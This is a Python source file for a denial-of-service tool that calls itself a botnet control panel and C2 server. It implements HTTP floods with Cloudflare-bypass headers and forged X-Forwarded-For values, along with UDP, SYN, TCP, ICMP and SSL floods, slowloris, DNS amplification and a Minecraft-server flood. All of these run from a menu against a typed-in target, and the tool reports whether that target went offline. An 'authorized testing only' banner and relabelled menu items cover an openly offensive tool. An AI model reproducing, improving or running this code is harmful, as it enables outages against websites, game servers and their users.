import socket
import threading
import sys
import time
import random
import os
import struct
import dns.resolver
import requests
import json
import shutil
import multiprocessing
from scapy.all import *
import threading
import cursor
import bcrypt
import getpass
from colorama import init, Fore, Back, Style
import ssl
import urllib3
urllib3.disable_warnings()

# Initialize colorama for Windows color support
init()

# Enhanced User-Agents list with modern browsers
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0", 
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    # ... existing user agents ...
]

# Cloudflare bypass headers
cf_headers = {
    'User-Agent': '',  # Will be randomly selected
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'TE': 'Trailers',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'sec-ch-ua': '"Chromium";v="121", "Google Chrome";v="121", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'DNT': '1'
}

def get_terminal_size():
    try:
        columns, rows = shutil.get_terminal_size()
        return rows, columns
    except:
        return 24, 80

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def center_text(text):
    _, terminal_width = get_terminal_size()
    lines = text.split('\n')
    centered_lines = []
    
    for line in lines:
        padding = (terminal_width - len(line)) // 2
        centered_lines.append(' ' * padding + line)
    
    return '\n'.join(centered_lines)

def banner():
    print("""
    ╔══════════════════════════════════════════════════════════════
    ║                   BOTNET CONTROL PANEL v3.0                   
    ║           The Most Powerful DDoS Attack Framework            
    ╚══════════════════════════════════════════════════════════════
    """)

def check_target_status(target):
    try:
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        response = requests.get(f"http://{target}", headers=headers, timeout=5)
        return f"Online (Status: {response.status_code})"
    except:
        try:
            response = requests.get(f"https://{target}", headers=headers, timeout=5)
            return f"Online (Status: {response.status_code})"
        except:
            return "Offline"

def get_cf_clearance(target):
    try:
        session = requests.Session()
        session.headers.update({
            'User-Agent': random.choice(user_agents),
            **cf_headers
        })
        
        # Try to get initial cookies
        response = session.get(f"https://{target}", 
                             verify=False, 
                             timeout=10,
                             allow_redirects=True)
        
        return session.cookies.get_dict()
    except:
        return {}

def generate_cf_headers(target):
    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'TE': 'Trailers',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'sec-ch-ua': '"Chromium";v="121", "Google Chrome";v="121", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'DNT': '1',
        'Origin': f"https://{target}",
        'Referer': f"https://{target}/",
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        'CF-Connecting-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        'viewport-width': str(random.randint(1000, 2500)),
        'device-memory': f"{random.randint(4, 32)}",
        'rtt': str(random.randint(50, 250)),
        'downlink': str(random.randint(5, 25)),
        'ect': random.choice(['4g', '3g']),
        'sec-ch-prefers-color-scheme': random.choice(['light', 'dark'])
    }
    return headers

def layer7_attack(target, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            
            # Generate Cloudflare bypass headers
            headers = generate_cf_headers(target)
            
            for _ in range(50000):
                # Randomize path and query to bypass caching
                path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 10)))
                query = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(10, 20)))
                timestamp = int(time.time() * 1000)
                
                # Alternate between GET and POST with cache bypass
                if random.random() > 0.5:
                    request = f"GET {path}?{query}&_={timestamp} HTTP/1.1\r\n"
                else:
                    request = f"POST {path} HTTP/1.1\r\n"
                
                request += f"Host: {target}\r\n"
                
                # Add all Cloudflare bypass headers
                for header, value in headers.items():
                    request += f"{header}: {value}\r\n"
                
                request += "\r\n"
                
                # Add POST data with random payload
                if random.random() > 0.5:
                    post_data = "=" * random.randint(10000, 50000)
                    request += post_data
                
                s.send(request.encode())
                
                # Send partial requests to bypass rate limiting
                if random.random() > 0.7:
                    partial_request = "X" * random.randint(1, 100) + "\r\n"
                    s.send(partial_request.encode())
                    time.sleep(random.uniform(0.1, 0.5))
                
            # Small delay to bypass rate limiting
            time.sleep(random.uniform(0.1, 0.3))
            
        except:
            pass
            
def layer4_attack(target, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(65500)
            for _ in range(10000):  # Increased from 1000 to 10000
                s.sendto(bytes, (target, port))
                # Send to multiple nearby ports for amplification
                for p in range(port-10, port+10):  # Increased port range
                    try:
                        s.sendto(bytes, (target, p))
                    except:
                        pass
        except:
            pass

def syn_flood(target, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            for _ in range(5000):  # Increased from 500 to 5000
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Enhanced packet crafting
                ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, random.randint(1,65535), 0, 255, socket.IPPROTO_TCP, 0, 
                                     socket.inet_aton('0.0.0.0'), socket.inet_aton(target))
                tcp_header = struct.pack('!HHLLBBHHH', random.randint(1,65535), port, 0, 0, 5, 2, 8192, 0, 0)
                
                # Send multiple packets
                for _ in range(100):  # Increased from 10 to 100
                    s.sendto(ip_header + tcp_header, (target, 0))
        except:
            pass

def slowloris(target, port, duration):
    timeout = time.time() + duration
    sockets = []
    while time.time() < timeout:
        try:
            for _ in range(100000):  # Increased from 10000 to 100000
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.send(f"GET /?{random.randint(0, 999999999)} HTTP/1.1\r\n".encode('utf-8'))
                s.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode('utf-8'))
                s.send(f"Accept-language: en-US,en,q=0.5\r\n".encode('utf-8'))
                sockets.append(s)
            for s in sockets:
                try:
                    for _ in range(100):  # Increased from 10 to 100
                        s.send(f"X-a: {random.randint(1, 999999999)}\r\n".encode('utf-8'))
                except:
                    sockets.remove(s)
        except:
            pass

def tcp_flood(target, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            bytes = random._urandom(65500)
            for _ in range(10000):  # Increased from 1000 to 10000
                s.send(bytes)
                # Send additional data bursts
                for _ in range(10):  # Added multiple bursts
                    s.send(random._urandom(random.randint(10240, 65500)))
        except:
            pass

def dns_amplification(target, port, duration):
    timeout = time.time() + duration
    dns_servers = dns.resolver.resolve('.',"NS")
    
    # Additional DNS record types for amplification
    record_types = ['ANY', 'A', 'AAAA', 'MX', 'TXT', 'SOA', 'CNAME']
    
    while time.time() < timeout:
        try:
            for ns in dns_servers:
                for _ in range(5000):
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    
                    # Generate random subdomain for cache bypass
                    random_subdomain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
                    
                    # Create DNS query packet
                    dns_payload = (
                        b"\x00\x00"  # Transaction ID
                        b"\x01\x00"  # Flags: standard query
                        b"\x00\x01"  # Questions: 1
                        b"\x00\x00"  # Answer RRs: 0
                        b"\x00\x00"  # Authority RRs: 0
                        b"\x00\x00"  # Additional RRs: 0
                    )
                    
                    # Add random query type for amplification
                    query_type = random.choice(record_types)
                    dns_payload += random_subdomain.encode() + b"\x00" + query_type.encode()
                    
                    for _ in range(100):
                        s.sendto(dns_payload, (str(ns), 53))
                        s.sendto(dns_payload, (target, port))
        except:
            pass

def icmp_flood(target, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            for _ in range(5000):  # Increased from 500 to 5000
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                payload = random._urandom(65500)
                for _ in range(100):  # Increased from 10 to 100
                    s.sendto(payload, (target, 0))
        except:
            pass

def ssl_attack(target, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s = ssl.wrap_socket(s)
            bytes = random._urandom(65500)
            for _ in range(10000):  # Increased from 1000 to 10000
                s.write(bytes)
                # Additional SSL renegotiation requests
                for _ in range(10):  # Added multiple renegotiations
                    s.write(random._urandom(random.randint(10240, 65500)))
        except:
            pass

def minecraft_attack(target, duration):
    timeout = time.time() + duration
    minecraft_port = 25565  # Default Minecraft port
    
    print(f"\n[*] Starting Enhanced Minecraft Server Attack on {target}:{minecraft_port}")
    print("[*] Sending 900,000,000 requests with protection bypass")  # Increased from 90M to 900M
    print("[*] Attack will run for", duration, "seconds")
    
    # Extended Minecraft protocol versions for bypass
    protocols = [758, 757, 756, 755, 754, 753, 751, 736, 735, 578, 498, 404, 340, 316, 210, 110, 47, 5, 4, 3, 2, 1]
    
    while time.time() < timeout:
        try:
            # Massively enhanced TCP Connection Flood with Protocol Bypass
            for _ in range(100000):  # Increased from 30000 to 100000
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, minecraft_port))
                
                # Rotate through different protocol versions
                protocol_version = random.choice(protocols)
                
                # Enhanced handshake packet with protocol bypass
                handshake = (
                    b"\x00" +  # Packet ID
                    bytes([random.randint(0, 255)]) +  # Random length
                    bytes([protocol_version]) +  # Protocol version
                    bytes([len(target)]) + target.encode() +  # Server address
                    bytes([minecraft_port >> 8 & 255, minecraft_port & 255]) +  # Port
                    b"\x02"  # Next state (login)
                )
                s.send(handshake)
                
                # Random username with special bypass characters
                username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_§±!@#$%^&*(){}[]|;:,.<>?', k=32))
                
                # Enhanced login packet with bypass
                login = (
                    b"\x00" +  # Packet ID
                    bytes([len(username)]) + username.encode() +  # Username
                    b"\x00\x00\x00\x00" +  # Empty UUID
                    b"\xFF\xFF\xFF\xFF"  # Additional bypass data
                )
                s.send(login)
                
                # Super massive packet burst
                for _ in range(10000):  # Increased from 3000 to 10000
                    burst = random._urandom(65500)
                    s.send(burst)
                    
                    # Additional attack vectors
                    s.send(b"\x0F" + random._urandom(65500))  # Keep-alive packets
                    s.send(b"\x1F" + random._urandom(65500))  # Plugin message packets
                    s.send(b"\x2F" + random._urandom(65500))  # Custom payload packets
        except:
            pass
        
        try:
            # Enhanced UDP Flood with port scanning
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes_data = random._urandom(65500)
            for _ in range(100000):  # Increased from 30000 to 100000
                # Attack main port and extended port range
                for port in range(minecraft_port-100, minecraft_port+100):  # Increased port range
                    for _ in range(1000):  # Increased from 100 to 1000 packets per port
                        s.sendto(bytes_data, (target, port))
        except:
            pass
        
        try:
            # Enhanced Query Protocol Flood
            for _ in range(100000):  # Increased from 30000 to 100000
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, minecraft_port))
                
                # Multiple enhanced query packets
                for _ in range(1000):  # Increased from 100 to 1000
                    query = b"\x00\x00" + target.encode() + b"\x00\x25\x00\x00\x00\x00\x00" + random._urandom(2048)
                    s.send(query)
                    
                    # Status spam with random data
                    status = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + random._urandom(4096)
                    s.send(status)
                    
                    # Additional attack vectors
                    s.send(b"\xFF\xFF" + random._urandom(8192))  # Legacy server list ping
                    s.send(b"\xFE\x01" + random._urandom(16384))  # Legacy ping
                    s.send(b"\x07" + random._urandom(32768))  # Resource pack packets
        except:
            pass

def print_matrix_effect():
    matrix = [
        "█ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █",
        "░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░",
        "▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓"
    ]
    for line in matrix:
        print(center_text(line))
        time.sleep(0.1)

def simulate_loading(loading_messages):
    for msg in loading_messages:
        print(center_text(msg))
        time.sleep(0.3)
        clear()

def print_fancy_text(text_array):
    for line in text_array:
        print(center_text(line))
        time.sleep(0.1)

def hide_cursor():
    cursor.hide()

def show_cursor():
    cursor.show()

def print_glitch_effect(text, duration=0.5):
    glitch_chars = "!@#$%^&*()_+-=[]{}|;:,.<>?"
    original_text = text
    start_time = time.time()
    
    while time.time() - start_time < duration:
        glitched_text = ""
        for char in original_text:
            if random.random() < 0.1:  # 10% chance to glitch each character
                glitched_text += random.choice(glitch_chars)
            else:
                glitched_text += char
        print(center_text(glitched_text), end='\r')
        time.sleep(0.05)
    print(center_text(original_text))

def matrix_rain(duration=1):
    matrix_chars = "ﾊﾐﾋｰｳｼﾅﾓﾆｻﾜﾂｵﾘｱﾎﾃﾏｹﾒｴｶｷﾑﾕﾗｾﾈｽﾀﾇﾍ"
    terminal_width = shutil.get_terminal_size().columns
    drops = [0] * terminal_width
    start_time = time.time()
    
    while time.time() - start_time < duration:
        line = ""
        for i in range(terminal_width):
            if drops[i] > 0:
                line += random.choice(matrix_chars)
                drops[i] += 1
                if drops[i] > 5:  # Reset after 5 characters
                    drops[i] = 0
            else:
                line += " "
                if random.random() < 0.02:  # 2% chance to start a new drop
                    drops[i] = 1
        print(line)
        time.sleep(0.05)
        
def animate_progress(text, duration):
    spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    start_time = time.time()
    i = 0
    
    while time.time() - start_time < duration:
        print(center_text(f"{spinner[i]} {text}"), end='\r')
        time.sleep(0.1)
        i = (i + 1) % len(spinner)
    print()

def load_animation_config():
    try:
        with open('login_animation.json', 'r') as f:
            return json.load(f)
    except:
        print("Error: Animation file not found!")
        sys.exit(1)

def load_auth_config():
    try:
        with open('auth.json', 'r') as f:
            return json.load(f)
    except:
        print("Error: auth.json not found!")
        sys.exit(1)

def print_centered(text):
    terminal_width = shutil.get_terminal_size().columns
    for line in text.split('\n'):
        print(line.center(terminal_width))

def animate_text(text, delay=0.1):
    print()
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print("\n")

def display_boot_sequence():
    animation = load_animation_config()
    for step in animation['boot_sequence']:
        animate_text(step['text'])
        time.sleep(step['delay'])
    clear()

def display_battle_sequence():
    animation = load_animation_config()
    for _ in range(animation['styling']['animations']['battle']['repeat']):
        for frame in animation['battle_sequence']:
            print_centered(frame['frame'])
            time.sleep(animation['styling']['animations']['battle']['speed'])
            clear()

def display_victory():
    animation = load_animation_config()
    for msg in animation['victory_sequence']:
        print_centered(msg)
        time.sleep(0.7)
        clear()

def display_defeat():
    animation = load_animation_config()
    for msg in animation['defeat_sequence']:
        print_centered(msg)
        time.sleep(0.7)
        clear()

def login_system():
    auth = load_auth_config()
    clear()
    display_boot_sequence()
    
    attempts = 0
    max_attempts = auth['security']['max_attempts']
    
    while attempts < max_attempts:
        clear()
        print_centered("""
╔══════════════════════════════════════════════════════════════
║                   SECURE LOGIN TERMINAL                      
╚══════════════════════════════════════════════════════════════
""")
        
        username = input("\nUsername > ")
        password = getpass.getpass("Password > ")
        
        display_battle_sequence()
        
        if (username == auth['credentials']['username'] and 
            password == auth['credentials']['password']):
            display_victory()
            return True
        
        attempts += 1
        display_defeat()
        
        if attempts < max_attempts:
            print_centered(f"Login failed! Attempts remaining: {max_attempts - attempts}")
            time.sleep(2)
    
    print_centered("Maximum login attempts exceeded. System locked.")
    sys.exit(1)

def main():
    if not login_system():
        sys.exit(1)
        
    while True:
        clear()
        banner()
        print("""
                    \033[31m_                      _______                      _
  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
 dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
 V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
      __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
 _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._

             `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
  YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
     `'                  `OObNNNNNdOO'                   `'
                           `~OOOOO~'           Alien C2 Server [ L7 & L4 ]\033[0m
        ╔══════════════════════════════════════════════════════════════════════════
        ║                      ADVANCED NETWORK STRESS TESTING                      
        ║                        SECURITY RESEARCH TOOLKIT                          
        ╠══════════════════════════════════════════════════════════════════════════
        ║                        Network Analysis Methods                           
        ╠══════════════════════════════════════════════════════════════════════════
        ║ [1] L7: HTTP(S) Load Test \033[33mPRO\033[0m   Performance analysis of web services
        ║ [2] L4: UDP Stress Test \033[33mPRO\033[0m     Network capacity measurement
        ║ [3] L4: TCP SYN Analysis \033[33mPRO\033[0m    Connection handling evaluation
        ║ [4] L7: Slowloris Test \033[33mPRO\033[0m      Connection pool saturation testing
        ║ [5] L4: TCP Connection Test    System resource monitoring
        ║ [6] L3: DNS Response Analysis  DNS infrastructure testing
        ║ [7] L3: ICMP Echo Test         Network latency measurement
        ║ [8] L7: SSL/TLS Benchmark      Crypto processing assessment
        ║ [9] L4: Minecraft Server Test  90M Requests + Protection Bypass
        ║ [10] Exit                      Terminate testing suite
        ╠══════════════════════════════════════════════════════════════════════════
        ║    NOTICE: For authorized security testing and research only. Ensure     
        ║            you have explicit permission before running any tests.        
        ╚══════════════════════════════════════════════════════════════════════════
        """)
        choice = input("┌──(BOTNET)─[~]\n└─$ ")
        
        if choice == "10":
            print("\nThank you for using our services!")
            sys.exit()
        
        if choice == "9":
            target = input("\nMinecraft Server IP/Domain > ")
            duration = int(input("Duration (seconds) > "))
            
            target_status = check_target_status(target)
            
            clear()
            print(f"""
╔══════════════════════════════════════
║        Minecraft Attack Started!     
╠══════════════════════════════════════
║ Target: {target:<27} 
║ Port: 25565 (Minecraft Default)
║ Duration: {duration} seconds{' '*(19-len(str(duration)))} 
║ Target Status: {target_status:<21}
╚══════════════════════════════════════
""")
            
            # Start attack processes
            processes = []
            for _ in range(multiprocessing.cpu_count() * 2):  # Use 2x CPU cores
                p = multiprocessing.Process(target=minecraft_attack, args=(target, duration))
                p.start()
                processes.append(p)
            
            time.sleep(duration)
            for p in processes:
                p.terminate()
                
            final_status = check_target_status(target)
            print(f"""
╔══════════════════════════════════════
║      Minecraft Attack Completed! 🎯  
║ Final Target Status: {final_status:<16}
╚══════════════════════════════════════
""")
            input("\nPress Enter to continue...")
            continue
            
        target = input("\nTarget IP/Domain > ")
        port = int(input("Port > "))
        duration = int(input("Duration (seconds) > "))
        threads = int(input("Threads > "))
        
        target_status = check_target_status(target)
        
        clear()
        print(f"""
╔══════════════════════════════════════
║           Attack Started!            
╠══════════════════════════════════════
║ Target: {target:<27} 
║ Port: {port:<29} 
║ Duration: {duration} seconds{' '*(19-len(str(duration)))} 
║ Threads: {threads:<26} 
║ Target Status: {target_status:<21}
╚══════════════════════════════════════
""")

        attack_funcs = {
            "1": layer7_attack,
            "2": layer4_attack,
            "3": syn_flood,
            "4": slowloris,
            "5": tcp_flood,
            "6": dns_amplification,
            "7": icmp_flood,
            "8": ssl_attack
        }
        
        if choice in attack_funcs:
            processes = []
            for _ in range(threads):
                p = multiprocessing.Process(target=attack_funcs[choice], args=(target, port, duration))
                p.start()
                processes.append(p)
            
            time.sleep(duration)
            for p in processes:
                p.terminate()
            
        final_status = check_target_status(target)
        print(f"""
╔══════════════════════════════════════
║         Attack Completed! 🎯        
║ Final Target Status: {final_status:<16}
╚══════════════════════════════════════
""")
        input("\nPress Enter to continue...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nExiting... Thanks for using our services!")
        sys.exit()
